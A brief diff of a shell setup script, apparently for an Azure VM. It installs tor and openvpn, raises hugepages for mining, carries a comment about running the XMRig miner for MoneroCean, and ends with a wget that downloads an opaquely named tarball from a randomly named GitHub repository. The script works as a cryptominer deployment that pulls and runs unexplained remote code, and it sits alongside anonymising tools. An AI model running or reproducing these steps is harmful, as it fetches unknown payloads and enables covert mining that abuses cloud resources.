@@ -2,8 +2,8 @@
 sudo apt install tmux tor mc openvpn -y
 cd home/azureuser
 sudo systemctl start tor
-sudo /usr/sbin/sysctl -w vm.nr_hugepages=208
-/usr/sbin/sysctl -w vm.nr_hugepages=208
+sudo /usr/sbin/sysctl -w vm.nr_hugepages=1200
+/usr/sbin/sysctl -w vm.nr_hugepages=1200
 cd home/azureuser
 ### MONEROCEAN С КОНФИГОМ: tmux new -ds servak sudo ./xmrig
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/dolblu_shluh.tar.gz -P /home/azureuser
